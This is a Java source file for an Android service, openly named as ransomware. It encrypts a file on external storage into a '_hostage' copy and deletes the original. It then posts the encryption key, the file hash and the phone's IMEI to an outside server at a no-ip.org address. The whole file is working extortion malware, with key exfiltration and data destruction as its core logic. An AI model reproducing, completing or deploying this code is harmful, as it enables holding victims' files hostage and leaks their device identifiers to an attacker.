package com.ransom.ransomwarer;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.HttpVersion;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.CoreProtocolPNames;
import org.apache.http.util.EntityUtils;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import com.google.common.hash.Hashing;
import com.google.common.io.Files;

public class MainService extends IntentService {
	private String ACTION = "com.ransom.ransomwarer.action.RANSOM_ACTION";

	public MainService() {
		super("RansomwareService");
	}

	public MainService(String name) {
		super(name);
	}

	private class KeyFilePair {
		public KeyFilePair(String fileName, String fileDigest, String key) {
			super();
			this.fileName = fileName;
			this.fileDigest = fileDigest;
			this.key = key;
		}

		public String fileName;
		public String fileDigest;
		public String key;
	}

	private class CipherTask extends AsyncTask<File, String, KeyFilePair> {
		protected void onPostExecute(KeyFilePair result) {
			if (result != null) {
				sendKeyToServer(result);
			}
		}

		private static final String URL = "http://manzana.no-ip.org/subir.php";
		
		private class SendFileToServer extends AsyncTask<KeyFilePair,Void,Void>{
			protected Void doInBackground(KeyFilePair... arg0) {
				KeyFilePair p = arg0[0];
				try {
					HttpPost post = new HttpPost(URL);
					HttpClient client = new DefaultHttpClient();
					client.getParams().setParameter(
							CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);

					List<NameValuePair> content = new ArrayList<NameValuePair>();
					content.add(new BasicNameValuePair("sha1", p.fileDigest));
					content.add(new BasicNameValuePair("pwd", p.key));
					content.add(new BasicNameValuePair("fileName", p.fileName));

					TelephonyManager t = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
					content.add(new BasicNameValuePair("imei",t.getDeviceId()));

					post.setEntity(new UrlEncodedFormEntity(content));

					HttpResponse response = client.execute(post);

					Log.d("RANSOMWARER","Server replied: "+ EntityUtils.toString(response.getEntity()));
				} catch (Exception e) {
					Log.e("RANSOMWARER", "Exception sending data: ", e);
				}

				return null;
			}
			
		}
		private void sendKeyToServer(KeyFilePair p) {
			new SendFileToServer().execute(p);
		}

		protected KeyFilePair doInBackground(File... files) {
			KeyProvider provider = new CacheGeneratorKeyProvider();
			RansomwareHandler handler = new RansomwareHandler(provider);

			try {
				handler.encrypt(files[0], files[1]);
			} catch (Exception e) {
				Log.e("RANSOMWARER", "Exception", e);
				return null;
			}

			if (!files[0].delete()) {
				Log.e("RANSOMWARER",
						"Could not delete" + files[0].getAbsolutePath());
			}

			String result = Base64.encodeToString(provider.getKey()
					.getEncoded(), Base64.DEFAULT);

			return new KeyFilePair(files[0].getName(), computeSHA1(files[1]),
					result);
		}

		private String computeSHA1(File file) {
			try {
				return Files.hash(file, Hashing.sha1()).toString();
			} catch (IOException e) {
				return "";
			}
		}

	}

	@Override
	protected void onHandleIntent(Intent intent) {
		String action = intent.getAction();
		String type = intent.getType();
		if (ACTION.equals(action) && "ransom/note".equals(type)) {
			File root = Environment.getExternalStorageDirectory();
			String sharedText = intent.getStringExtra(Intent.EXTRA_TEXT);

			new CipherTask().execute(new File(root, sharedText), new File(root,
					sharedText + "_hostage"));
		}
	}
}
